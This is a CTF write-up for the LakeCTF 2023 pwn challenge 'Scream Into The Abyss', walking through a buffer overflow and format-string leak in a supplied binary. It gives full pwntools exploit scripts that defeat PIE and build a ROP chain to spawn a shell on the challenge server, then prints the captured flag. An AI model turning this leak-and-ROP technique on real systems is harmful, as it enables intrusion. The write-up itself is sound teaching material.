---
title:  "LakeCTF 2023 - Scream Into The Abyss"
seo_title: "LakeCTF writeup for the Scream Into The Abyss binary exploitation (pwn) challenge"
date:   2023-11-06T15:00
categories: ['CTF', 'Binary-Exploitation']
excerpt: LakeCTF 2023 writeup for the Scream Into The Abyss binary exploitation challenge.
---

![](/assets/images/headers/lake-ctf.png)

# Challenge
We are given the following files:
- nc chall.polygl0ts.ch 9001
- abyss_scream
- Dockerfile

Lets see what we are dealing with and list the protections that are enabled:
```console
$ checksec abyss_scream
[*] '../LakeCTF/pwn_abyss/abyss_scream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Source code of `main` and `save_msg` functions.
```c
void main(void)
{
   int iVar1;
   uint local_c;
   
   local_c = 0;
   printf("Scream into the abyss and see how long it takes for you to get a response ;)");
   do {
      while( true ) {
          printf("Current iteration: %d\n",(ulong)local_c);
          printf("Enter input: ");
          fflush(stdout);
          iVar1 = getchar();
          getchar();
          if ((char)iVar1 != 'x') break;
          save_msg(local_c);
          local_c = 0;
      }
      local_c = local_c + 1;
   } while( true );
}

void save_msg(uint param_1)
{
   char local_118 [264];
   char *local_10;
   
   local_10 = (char *)calloc(8,1);
   printf("You can now scream a longer message but before you do so, we\'ll take your name: ");
   fflush(stdout);
   gets(local_10);
   printf("Saved score of %d for %s. Date and Time: ",(ulong)param_1,local_10);
   fflush(stdout);
   system("date");
   printf("Now please add a message: ");
   fflush(stdout);
   gets(local_118);        # vulnerable to buffer overflow
   puts("Your message:");
   printf(local_118);      # format string vulnerability
   puts("");
   fflush(stdout);
   return;
}
```
When we run the program and enter `x`, we get into the `save_msg` function that contains both a buffer overflow and format string vulnerability that we can exploit to execute `system("/bin/sh")` and read the flag on the file system.

## Finding the Offset
We can create a cyclic pattern and calculate the offset to our return address. Lets open GDB and enter our payload after it asks us to input our message.
Because the binary does a call to `system(date)`, we can't debug after this call and have to jump past it. First we disassemble the `save_msg` function to find where we can set a breakpoint.
```console
pwndbg> disass save_msg
...
0x000000000000128f <+134>:	call   0x1110 <fflush@plt>
0x0000000000001294 <+139>:	lea    rax,[rip+0xdef]        # 0x208a
0x000000000000129b <+146>:	mov    rdi,rax
0x000000000000129e <+149>:	call   0x10c0 <system@plt>
0x00000000000012a3 <+154>:	lea    rax,[rip+0xde5]        # 0x208f
0x00000000000012aa <+161>:	mov    rdi,rax
0x00000000000012ad <+164>:	mov    eax,0x0
0x00000000000012b2 <+169>:	call   0x10d0 <printf@plt>
...
```
We will set a breakpoint right before the system call and then jump to `save_msg+154`:
```console
pwndbg> b *save_msg+146
pwndbg> b *save_msg+219
pwndbg> r
pwndbg> jump *save_msg+154

Continuing at 0x5555555552a3.
Saved score of 0 for x. Date and Time: Now please add a message: 
```
Now we can enter our cyclic pattern in the prompt and inpect the `RSP` to calculate our offset:
```console
*RBP  0x6361617463616173 ('saactaac')
*RSP  0x7fffffffdf08 ◂— 'uaacvaacwaacxaacyaac'
*RIP  0x55555555531d (save_msg+276) ◂— ret 

$ python3 -c 'from pwn import *;print(cyclic_find("uaac"))'
280
```
### Testing our offset
Next we can confirm that this is the right offset by creating a small python script that puts `0xdeadbeef` at our found offset.
```python
from pwn import *

exe = './abyss_scream'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

p = process(exe)

p.sendlineafter(b'Enter input: ', 'x')
p.sendlineafter(b'name: ', 'x')

payload = flat({
  padding: [
    0xdeadbeef
  ]
})

p.sendlineafter(b'message: ', payload)
```
Demonstrating that it works:
```console
$ python3 exploit.py
$ sudo dmesg | tail -n 2
[ 1202.784357] abyss_scream[6648]: segfault at deadbeef ip 00000000deadbeef sp 00007ffefe45a900 error 14
[ 1202.784384] Code: Unable to access opcode bytes at 0xdeadbec5.
```
## Leaking Addresses
Because of the format string vulnerability we can leak addresses of the stack. Lets create a small fuzzing script that will loop through several leaked addresses to see if we find interesting addresses.
```python
from pwn import *

exe = './abyss_scream'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warning'

def send_payload(payload, name):
   p.recvuntil(b"input: ")
   p.sendline(b"x")
   p.recvuntil(b"name: ")
   p.sendline(name)
   p.recvuntil(b"message: ")
   p.sendline(payload)

data = b""
i = 0
name_str = "bytebl33d"
for i in range(50):
   try:
      p = start()
      send_payload(f"%{i}$p".encode(), name=name_str)
      p.recvuntil(b"Your message:\n")
      data = p.recvuntil(b"\n")
      print(i, data)
      p.recvuntil(b"input: ")
      p.close()
   except EOFError:
      pass
```
We try looking for addresses starting with `0x55`, and we find a few that might be useful:
```
4 b'0x56168b3e66b5\n'
...
37 b'0x55cdf5071d90\n'
...
41 b'0x561bf357a6c0\n'
...
43 b'0x55e4378d139e\n'
```
We inspect them in gdb one by one and come to the following conclusions:
```console
# 41th address points to the beginning of our name input
pwndbg> x/s 0x561bf357a6c0
0x561bf357a6c0:	"bytebl33d"

# 43th address points to main+128
pwndbg> x 0x55e4378d139e
0x55e4378d139e <main+128>:	0x00fc45c7
```
Based on this information we can calculate the address of `main` and the address of our input buffer. The latter can be used to store our string to `/bin/sh\x00`. We add the following to our exploit script:
```python
def get_leak_address(index):
    send_payload("%{}$p".format(index))
    p.recvuntil(b"Your message:\n")
    data = p.recvuntil(b"\n")
    return int(data, 16)

print("main (symbols) @", context.binary.symbols["main"])
main_addr = get_leak_address(43) - 128
info(f'main_addr @ {hex(main_addr)}')

piebase = main_addr - context.binary.symbols["main"]
info(f'PIE base @ {hex(piebase)}')
```
With this code we can calculate the pie base address:
```console
$ python3 exploit.py 
main (symbols) @ 4894
[*] main_addr @ 0x55870bfb131e
[*] PIE base @ 0x55870bfb0000
```
### Finding useful instructions
We will need a `pop rdi` and `ret` gadget that we can find in gdb or with ropper. The reason fo the `ret` gadget is that when we perform our buffer overflow, we have to realign the stack before continuing our chain. When `ret` is invoked, it increments `$rsp` by 8. Thus, you can simply add a dummy ret to make `$rsp` 16-byte aligned.
```console
$ ropper --file abyss_scream --search "pop rdi"
[INFO] File: abyss_scream
0x00000000000013b5: pop rdi; ret; 

$ ropper --file abyss_scream --search "ret"
[INFO] File: abyss_scream
0x000000000000101a: ret;
```
## ROP Chain
We can now use both gadgets to set the first argument of the system function with the address of `/bin/sh`, and then call the `system` function.
```python
# pop_rdi gadget
pop_rdi = elf.address + 0x13b5
info(f'pop_rdi @ {hex(pop_rdi)}')

# ret gadget
ret = elf.address + 0x101a
info(f'ret @ {hex(ret)}')

# system call address
system = elf.plt.system
info(f'system @ {hex(system)}')

# leak binsh address 
bin_sh = get_leak_address(41)
print("/bin/sh @", hex(bin_sh))

payload = flat({
   padding: [
      ret,
      pop_rdi,
      bin_sh,
      system
   ]
})
```

## Final Exploit
Here is the final exploit script that executes our ROP chain with all the required addresses.
```python
from pwn import *

exe = './abyss_scream'
elf = context.binary = ELF(exe, checksec=False)

p = remote("chall.polygl0ts.ch", 9001)

padding = 280

def send_payload(payload, name=b"bytebl33d"):
  p.recvuntil(b"input: ")
  p.sendline(b"x")
  p.recvuntil(b"name: ")
  p.sendline(name)
  p.recvuntil(b"message: ")
  p.sendline(payload)

def get_leak_address(index, name=b"/bin/sh\x00"):
   send_payload("%{}$p".format(index), name)
   p.recvuntil(b"Your message:\n")
   data = p.recvuntil(b"\n")
   return int(data, 16)

print("main (symbols) @", context.binary.symbols["main"])
main_addr = get_leak_address(43) - 128
info(f'main_addr @ {hex(main_addr)}')

elf.address = main_addr - context.binary.symbols["main"]
info(f'PIE base @ {hex(elf.address)}')

# pop_rdi gadget
pop_rdi = elf.address + 0x13b5
info(f'pop_rdi @ {hex(pop_rdi)}')

# ret gadget
ret = elf.address + 0x101a
info(f'ret @ {hex(ret)}')

# system call address
system = elf.plt.system
info(f'system @ {hex(system)}')

# binsh address 
bin_sh = get_leak_address(41)
print("/bin/sh @", hex(bin_sh))

payload = flat({
   padding: [
      ret,
      pop_rdi,
      bin_sh,
      system
   ]
})

send_payload(payload)

p.interactive()
p.close()
```
And when executing the script we get a shell:
```console 
$ python3 exploit.py
[+] Opening connection to chall.polygl0ts.ch on port 9001: Done
main (symbols) @ 4894
[*] main_addr @ 0x55d92859331e
[*] PIE base @ 0x55d928592000
[*] pop_rdi @ 0x55d9285933b5
[*] system @ 0x55d9285930c4
[*] ret @ 0x55d92859301a
/bin/sh @ 0x55d9291e06f0
[*] Switching to interactive mode
Your message:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaac\x1a0Y(\xd9U
$ id
uid=1000(jail) gid=1000(jail) groups=1000(jail)
$ ls
flag.txt
run
$ cat flag.txt
EPFL{H3Y_C4LM_D0WN_N0_N33D_T0_SCR34M_S0_L0UD_1_C4N_H34R_Y0U!!!!!!}
```
